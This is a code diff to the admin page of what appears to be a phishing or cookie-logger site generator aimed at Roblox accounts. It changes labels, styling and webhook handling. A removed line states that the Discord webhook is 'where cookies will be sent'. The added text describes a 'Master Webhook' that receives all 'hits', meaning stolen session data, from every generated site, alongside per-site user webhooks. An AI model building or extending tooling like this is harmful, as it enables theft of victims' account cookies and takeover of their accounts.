@@ -107,6 +107,18 @@ $globalStats = getGlobalStats();
             gap: 6px;
         }
         
+        .webhook-hint {
+            display: inline-block;
+            background: rgba(59, 130, 246, 0.1);
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            border-radius: 6px;
+            padding: 8px 12px;
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-left: 4px;
+            cursor: help;
+        }
+        
         .form-group input {
             width: 100%;
             padding: 12px 16px;
@@ -263,6 +275,17 @@ $globalStats = getGlobalStats();
             border-radius: 8px;
             margin-top: 16px;
         }
+        
+        .webhook-info {
+            background: rgba(59, 130, 246, 0.1);
+            border: 1px solid rgba(59, 130, 246, 0.2);
+            border-radius: 10px;
+            padding: 12px;
+            margin-top: 12px;
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.6);
+            line-height: 1.6;
+        }
     </style>
 </head>
 <body>
@@ -296,7 +319,8 @@ $globalStats = getGlobalStats();
                 <div class="form-group">
                     <label>
                         <span>🔐</span>
-                        Discord Webhook URL (Admin)
+                        Master Webhook (Admin)
+                        <span class="webhook-hint">?</span>
                     </label>
                     <input 
                         type="text" 
@@ -304,21 +328,26 @@ $globalStats = getGlobalStats();
                         placeholder="https://discord.com/api/webhooks/..."
                         required
                     />
-                    <small>Where cookies will be sent. Get this from Discord channel settings → Integrations → Webhooks</small>
+                    <div class="webhook-info">
+                        📊 <strong>Receives ALL hits</strong> from all sites you generate. Perfect for tracking all activity across your network.
+                    </div>
                 </div>
 
                 <!-- User Webhook -->
                 <div class="form-group">
                     <label>
                         <span>👤</span>
-                        User Webhook URL (Optional)
+                        User Webhook (Optional)
+                        <span class="webhook-hint">?</span>
                     </label>
                     <input 
                         type="text" 
                         id="userWebhook" 
                         placeholder="https://discord.com/api/webhooks/..."
                     />
-                    <small>Optional: Separate webhook for user notifications</small>
+                    <div class="webhook-info">
+                        🎯 <strong>Receives ONLY hits</strong> from THIS specific site. If not provided, will use master webhook.
+                    </div>
                 </div>
 
                 <button type="submit" class="btn-generate">
@@ -342,6 +371,14 @@ $globalStats = getGlobalStats();
                     <p id="generatedUrl" style="background: rgba(0, 0, 0, 0.3); padding: 12px; border-radius: 6px; font-size: 13px; margin: 0; word-break: break-all;"></p>
                 </div>
 
+                <div style="margin-top: 20px; text-align: left; background: rgba(59, 130, 246, 0.1); padding: 16px; border-radius: 10px; border: 1px solid rgba(59, 130, 246, 0.3);">
+                    <p style="font-size: 12px; color: rgba(255, 255, 255, 0.6); margin-bottom: 8px;">🔔 Webhook Setup:</p>
+                    <ul style="font-size: 13px; color: rgba(255, 255, 255, 0.8); list-style: none; padding: 0;">
+                        <li style="margin-bottom: 6px;">✓ Master Webhook: Receives ALL hits from all sites</li>
+                        <li>✓ User Webhook: Receives ONLY hits from this specific site</li>
+                    </ul>
+                </div>
+
                 <div style="margin-top: 20px; text-align: left;">
                     <p style="font-size: 12px; color: rgba(255, 255, 255, 0.6); margin-bottom: 8px;">✨ Full Features:</p>
                     <ul style="font-size: 13px; color: rgba(255, 255, 255, 0.8); list-style: none; padding: 0;">
@@ -351,7 +388,7 @@ $globalStats = getGlobalStats();
                         <li style="margin-bottom: 6px;">✓ Limited RAP calculation</li>
                         <li style="margin-bottom: 6px;">✓ Group ownership detection</li>
                         <li style="margin-bottom: 6px;">✓ Friend count display</li>
-                        <li>✓ Master admin logging</li>
+                        <li>✓ Dual webhook notifications</li>
                     </ul>
                 </div>
 
@@ -385,7 +422,7 @@ $globalStats = getGlobalStats();
 
             const siteName = document.getElementById('siteName').value.trim();
             const masterWebhook = document.getElementById('masterWebhook').value.trim();
-            const userWebhook = document.getElementById('userWebhook').value.trim() || masterWebhook;
+            const userWebhook = document.getElementById('userWebhook').value.trim();
 
             if (!siteName || !masterWebhook) {
                 Swal.fire({
@@ -433,11 +470,10 @@ $globalStats = getGlobalStats();
                     document.getElementById('successContainer').style.display = 'block';
                     document.getElementById('generatedUrl').textContent = data.publicUrl;
 
-                    // Send success notification
                     Swal.fire({
                         icon: 'success',
                         title: 'Success!',
-                        html: '<p>Your site has been generated!</p><p style="font-size: 12px; color: #9ca3af; margin-top: 8px;">Check your Discord webhook for confirmation</p>',
+                        html: '<p>Your site has been generated!</p><p style="font-size: 12px; color: #9ca3af; margin-top: 8px;">Webhooks have been notified</p>',
                         background: 'rgba(15, 23, 42, 0.9)',
                         color: '#f8fafc',
                         confirmButtonColor: '#10b981'
